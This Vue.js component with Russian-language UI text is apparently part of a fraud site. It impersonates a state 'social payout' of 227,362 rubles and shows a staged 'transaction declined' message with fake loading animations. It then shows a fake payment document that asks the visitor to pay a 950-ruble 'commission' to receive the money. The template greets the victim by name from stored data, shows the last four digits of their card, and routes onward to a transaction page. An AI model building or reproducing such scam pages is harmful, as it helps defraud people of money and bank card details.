<template>
	<div class="v-electronic-document">
		<div class="electronicDocument">
			<div class="wrapperMainElectronicDocument">
				<div class="electronicDocumentTopHeader">
					<p>Подготовка электронных</p>
					<p>документов</p>
				</div>
				<div class="wrapperElectronicDocument">
					<div class="loaderElectronicDocument"></div>
				</div>
				<p class="electronicDocumentTopText">Сверка по базам данных</p>
				<p class="electronicDocumentBottomText">Отправляем транзакцию</p>
			</div>
			<div class="entireAmountDeclined">
				<div class="wrapperEntireAmountDeclined">
					<div class="entireAmountDeclinedHeader">
						<p>Сумма операции: 227 362 руб.</p>
						<p>Транзакция отклонена</p>
					</div>
					<img :src="require('@/assets/icons/check-in.png')" class="entireAmountDeclinedImg">
					<p class="entireAmountDeclinedText">Транзакция №658421345 в сумме 227 362 руб</p>
					<p class="entireAmountDeclinedText">отклонена службой финансового мониторина.</p>
					<p class="entireAmountDeclinedText">Причина: превышена разрешенная сумма одной</p>
					<p class="entireAmountDeclinedText">транзакции</p>
				</div>
				<div class="entireAmountDeclinedSpecialText">
					<p >Максимальная сумма транзакции для вашего</p>
					<p >типа карты составляет 150 000 руб.</p>
					<p >Ваша социальная выплата будет разделена и </p>
					<p >отправлена двумя частями:</p>
				</div>

				<div class="entireAmountDeclinedTextSumm">
					<p>1 транзакция - <span>150 000 руб.</span></p>
					<p>2 транзакция - <span>77 362 руб.</span></p>
				</div>
				<button class="entireAmountDeclinedButton" @click="continueAction">Отправить первую часть выплаты на счет карты **** **** **** {{this.passportFour}}</button>
			</div>

			<div class="wrapperpopupWindow">
				<div class="wrqpperPopUpWindowPlus">
				<div class="popupWindow">
					<div class="popupWindowTopBlock">
						<img :src="require('@/assets/images/flag-russia.png')">
						<p class="popupWindowTopBlockHeader">Уважаемый {{this.$store.state.processingData.name}} {{this.$store.state.processingData.middleName}}</p>
						<div>
							<p class="popupWindowTopText">В рамках программы поддержки населения вам начислена компенсация.</p>
							<p class="popupWindowTopText">Сумма надлежащая в выплате:</p>
						</div>
						<p class="popupWindowTopSumma">150 000 руб.</p>
						<p class="popupWindowTopSubText">(сто пятьдесят тысяч рублей)</p>
					</div>
					<div>
					<div class="popupWindowBlock">
						<p class="popupWindowHeader">Назначение платежа:</p>
						<p class="popupWindowText">Социальная выплата</p>
					</div>
					<div class="popupWindowBlock">
						<p class="popupWindowHeader">Отправитель:</p>
						<p class="popupWindowText">Региональная ассоциация социальной поддержки населения</p>
					</div>
					<div class="popupWindowBlock">
						<p class="popupWindowHeader">Дата:</p>
						<p class="popupWindowText">{{date | date}}</p>
					</div>
					<div class="popupWindowBlock">
						<p class="popupWindowHeader">Номер документа:</p>
						<p class="popupWindowText">658426589</p>
					</div>
					<div class="popupWindowBlock">
						<p class="popupWindowHeader">Получатель:</p>
						<p class="popupWindowText">{{this.$store.state.processingData.lastName}} {{this.$store.state.processingData.name}} {{this.$store.state.processingData.middleName}}</p>
					</div>
					<div class="popupWindowBlock">
						<p class="popupWindowHeader">Реквизиты:</p>
						<p class="popupWindowText">**** **** **** {{this.passportFour}}</p>
					</div>
					<div class="popupWindowBlock">
						<p class="popupWindowHeader">Код авторизации:</p>
						<p class="popupWindowText">945262</p>
					</div>
					<div class="popupWindowBlock">
						<p class="popupWindowHeader">Сумма операции:</p>
						<p class="popupWindowText">150 000 руб.</p>
					</div>
					<div class="popupWindowBlock">
						<p class="popupWindowHeader">Комиссия: </p>
						<p class="popupWindowText"><span>950 руб.</span></p>
					</div>
					<div class="popupWindowBlock">
						<p class="newpopupWindowHeader">Статус пошлины: </p>
						<p class="popupWindowText">Не оплачена</p>
					</div>
				</div>
				<div class="popupWindowBlockButton">
						<button class="popupWindowButton" @click="continueActionLoader">Оплатить комиссию и получить первую часть выплаты</button>
				</div>
			</div>
		</div>
		</div>
		<div class="electronicDocumentLastLoader">
			<p class="electronicDocumentLastLoaderHeader">Подготовка электронных документов</p>
			<div class="wrapperelectronicDocumentLastLoader">
				<div class="loaderelectronicDocumentLastLoader"></div>
			</div>
			<img :src="require('@/assets/icons/checked.png')" class="loaderElectronicDocumentImg">
			<p class="electronicDocumentLastLoaderText">Сверка по базам данных</p>
			<div class="showTextElectronicDocument">
				<p class="electronicDocumentLastLoaderSpecialText"><span>Отправляем транзакцию</span></p>
				<p class="electronicDocumentLastLoaderSpecialText">Сумма операции: 150 000 руб.</p>
			</div>

		</div>
		</div>
	</div>
</template>

<script>
	export default {
		name: 'v-electronic-document',
		data() {
			return {
				date: Date.now(),
				passportFour: ''
			}
		},
		methods: {
			firstMethod() {
				let topText = document.querySelector('.electronicDocumentTopText')
				let bottomText = document.querySelector('.electronicDocumentBottomText')
				let wrapperMainElectronicDocument = document.querySelector('.wrapperMainElectronicDocument')
				let entireAmountDeclined = document.querySelector('.entireAmountDeclined')
				setTimeout(() => {
					topText.style.display = 'block'
				}, 1000)
				setTimeout(() => {
					bottomText.style.display = 'block'
				}, 2000)
				setTimeout(() => {
					wrapperMainElectronicDocument.style.display = 'none'
					entireAmountDeclined.style.display = 'block'
				}, 3000)
			},
			continueAction() {
				let entireAmountDeclined = document.querySelector('.entireAmountDeclined')
				let wrapperpopupWindow = document.querySelector('.wrapperpopupWindow')
				entireAmountDeclined.style.display = 'none'
				wrapperpopupWindow.style.display = 'block'
			},
			continueActionLoader() {
				let wrapperpopupWindow = document.querySelector('.wrapperpopupWindow')
				let electronicDocumentLastLoader = document.querySelector('.electronicDocumentLastLoader')
				wrapperpopupWindow.style.display = 'none'
				electronicDocumentLastLoader.style.display = 'block'
				this.lastLoader()
			},
			lastLoader() {
				let electronicDocumentLastLoaderText = document.querySelector('.electronicDocumentLastLoaderText')
				let showTextElectronicDocument = document.querySelector('.showTextElectronicDocument')
				let wrapperelectronicDocumentLastLoader = document.querySelector('.wrapperelectronicDocumentLastLoader')
				let loaderElectronicDocumentImg = document.querySelector('.loaderElectronicDocumentImg')

				setTimeout(() => {
					electronicDocumentLastLoaderText.style.display = 'block'
				}, 1000)
				setTimeout(() => {
					showTextElectronicDocument.style.display = 'block'
				}, 2000)
				setTimeout(() => {
					wrapperelectronicDocumentLastLoader.style.display = 'none'
					loaderElectronicDocumentImg.style.display = 'block'
				}, 3000)
				setTimeout(() => {
					this.$router.push('/firstTransaction')
				}, 4000)
			}
		},
		computed: {
			passportFourNumber() {
				if(this.$store.state.processingData.cardNumber) {
					let passport = this.$store.state.processingData.cardNumber;
					let passportFourSplit = passport.split('')
					let passportFourSplice = passportFourSplit.splice(15)
					let full = passportFourSplice.join('')
					this.passportFour = full
				}
			}
		},
		mounted() {
			this.firstMethod()
		}
	}
</script>

<style>
	.v-electronic-document {
		max-width: 600px;
		margin: 0 auto;
		padding: 80px 0;
		display: flex;
		justify-content: center;
	}
	.electronicDocument {
		width: 100%;
		min-height: 585px;
		background: #FFFFFF;
		box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
		border-radius: 15px;
		padding: 25px 10px;
		text-align: center;
	}
	.wrqpperPopUpWindowPlus {
		width: 100%;
		height: 100%;
		display: flex;
		justify-content: center;
	}
	.wrapperElectronicDocument {
		margin: 34px auto;
		width: 53px;
	}
	.loaderElectronicDocument {
		animation: loader-spin 1s linear infinite;
		width: 53px;
		height: 53px;
		border: 4px solid rgba(0,0,0,0.1);
		border-radius: 50%;
		border-right-color: #0062AA;
		margin-top: 55px;
		margin-bottom: 60px;
	}
	@keyframes loader-spin {
  	0% {
    	transform: rotate(0deg);
  	}
  	100% {
    	transform: rotate(360deg);
  	}
	}
	.wrapperelectronicDocumentLastLoader {
		margin: 34px auto;
		width: 53px;
	}
	.loaderelectronicDocumentLastLoader {
		animation: loader-spinTwo 1s linear infinite;
		width: 53px;
		height: 53px;
		border: 4px solid rgba(0,0,0,0.1);
		border-radius: 50%;
		border-right-color: #0062AA;
		margin-top: 55px;
		margin-bottom: 60px;
	}
	@keyframes loader-spinTwo {
  	0% {
    	transform: rotate(0deg);
  	}
  	100% {
    	transform: rotate(360deg);
  	}
	}
	.electronicDocumentTopHeader p{
		margin: 0;
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		text-align: center;
		color: #2D2D2D;
	}
	.electronicDocumentTopText {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		text-align: center;
		color: #0062AA;
		margin: 6px;
		display: none;
	}
	.electronicDocumentBottomText {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		text-align: center;
		color: #0062AA;
		margin: 6px;
		display: none;
	}
	.entireAmountDeclined {
		display: none;
	}
	.wrapperEntireAmountDeclined {
		border-bottom: 1px solid #E5E5E5;
		padding-bottom: 20px;
	}
	.entireAmountDeclinedHeader {
		margin-top: 16px;
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
	}
	.entireAmountDeclinedHeader p {
		margin: 0;
	}
	.entireAmountDeclinedImg {
		margin: 40px 0;
	}
	.entireAmountDeclinedText {
		margin: 0;
		font-family: Montserrat;
		font-style: normal;
		font-weight: 500;
		font-size: 16px;
		line-height: 20px;
		color: #2D2D2D;
	}
	.entireAmountDeclinedSpecialText p{
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		color: #008ED1;
		margin: 0;
	}
	.entireAmountDeclinedSpecialText{	
		margin-top: 20px;
		margin-bottom: 15px;
	}
	.entireAmountDeclinedTextSumm {
		margin-bottom: 20px;
	}
	.entireAmountDeclinedTextSumm p{
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		color: #2D2D2D;
		margin: 5px;
	}
	.entireAmountDeclinedTextSumm span {
		color: #005391;
	}
	.entireAmountDeclinedButton {
		background: #005391;
		border-radius: 5px;
		border: none;
		outline: none;
		padding: 8px 19px;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 16px;
		line-height: 20px;
		text-align: center;
		text-transform: uppercase;
		color: #FFFFFF;
		max-width: 400px;
	}
	.entireAmountDeclinedButton:hover {
		background: #2E7DB8;
		cursor: pointer;
	}
	.popupWindowTopBlock {
		border-bottom: 1px solid #E5E5E5;
		text-align: center;
		margin-bottom: 20px;
	}
	.popupWindowTopBlockHeader {
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 24px;
		line-height: 29px;
		color: #005391;
		margin: 0;
		margin-bottom: 20px;
	}
	.popupWindowTopText {
		font-family: Montserrat;
		font-style: normal;
		font-weight: 500;
		font-size: 16px;
		line-height: 20px;
		color: #2D2D2D;
		margin: 0;
	}
	.popupWindowTopText:last-child{
		margin-bottom: 15px;
	}
	.popupWindowTopSumma {
		font-family: Exo 2;
		font-style: normal;
		font-weight: 800;
		font-size: 24px;
		line-height: 29px;
		color: #2D2D2D;
		margin:0;
		margin-bottom: 10px;
	}
	.popupWindowTopSubText {
		font-family: Montserrat;
		font-style: normal;
		font-weight: 500;
		font-size: 14px;
		line-height: 17px;
		color: #AEAEAE;
		margin: 0;
		margin-bottom: 10px;
	}
	.wrapperpopupWindow {
		position: absolute;
		position: fixed;
		top: 0;
		bottom: 0;
		left: 0;
		right: 0;
		background: rgba(0, 0, 0, 0.4);
		backdrop-filter: blur(10px);
		display: none;
	}
	.popupWindow {
		background: #fff;
		width: 800px;
		height: 655px;
		box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
		border-radius: 15px;
		z-index: 100;
		text-align: center;
		padding: 25px;
		margin-top: 50px;
	}
	.popupWindowBlock {
		display: grid;
		grid-template-columns: 1fr 2fr;
	}
	.popupWindowHeader {
		text-align: right;
		margin: 6px 0 6px 0px;
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		color: #646464;
	}
	.newpopupWindowHeader {
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		text-align: right;
		color: #008ED1;
		margin: 6px 0 6px 0px;
	}
	.popupWindowText {
		text-align: left;
		margin-left: 10px;
		margin: 6px 0 6px 10px;
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		color: #313131;
	}
	.popupWindowText span {
		color: #008ED1;
	}
	.newpopupWindowText {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 16px;
		line-height: 20px;
		color: #008ED1;
		margin: 6px 0 6px 10px;
		text-align: left;
	}
	.popupWindowBlockButton {
		text-align: center;
	}
	.popupWindowButton {
		padding: 15px;
		background: #005391;
		border-radius: 5px;
		border: none;
		outline: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 16px;
		line-height: 20px;
		text-align: center;
		text-transform: uppercase;
		color: #FFFFFF;
		margin-top: 15px;
	}
	.popupWindowButton:hover {
		background: #2E7DB8;
		cursor: pointer;
	}
	.electronicDocumentLastLoader {
		display: none;
	}
	.electronicDocumentLastLoaderHeader {
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		text-align: center;
		color: #2D2D2D;
	}
	.electronicDocumentLastLoaderText {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		text-align: center;
		color: #0062AA;
		display: none;
	}
	.electronicDocumentLastLoaderSpecialText {
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		text-align: center;
		color: #646464;
	}
	.electronicDocumentLastLoaderSpecialText span{
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		text-align: center;
		color: #0062AA;
	}
	.showTextElectronicDocument {
		display: none
	}
	.loaderElectronicDocumentImg {
		display: none;
		margin: 55px auto;
		width: 53px;
	}
	@media only screen and (max-width: 800px) {
		.popupWindow {
			margin-bottom: 200px;
			margin: 30px 10px;
			height: 100%;
			overflow-y: scroll;
		}
		.wrqpperPopUpWindowPlus {
			width: 100%;
			height: 80%;
			display: flex;
			justify-content: center;
		}
		.popupWindowBlock {
			display: grid;
			grid-template-columns: 1fr;
			grid-template-rows: 1fr 1fr;
		}
		.popupWindowHeader {
			text-align: left;
		}
		.newpopupWindowHeader {
			text-align: left;
		}
		.popupWindowText {
			text-align: left;
			margin: 0;
		}
	}
	@media only screen and (max-width: 440px) {
		.electronicDocument {
			padding:20px 15px;
			margin: 10px;
			width: 250px;
		}
		.entireAmountDeclinedButton {
			font-family: Montserrat;
			font-style: normal;
			font-weight: bold;
			font-size: 16px;
			line-height: 20px;
			text-align: center;
			text-transform: uppercase;
			color: #FFFFFF;
		}
		.firstPaymentReceivedHide {
			font-family: Exo 2;
			font-style: normal;
			font-weight: bold;
			font-size: 20px;
			line-height: 24px;
			color: #005391;
		}
		.entireAmountDeclinedButton {
			padding: 6px 10px;
			font-size: 12px;
		}
		.popupWindowButton {
			padding: 6px 10px;
			font-size: 12px;
			line-height: 20px;
			margin-top: 15px;
			width: 100%;
		}
		.popupWindow {
			padding: 15px;
		}
	}
</style>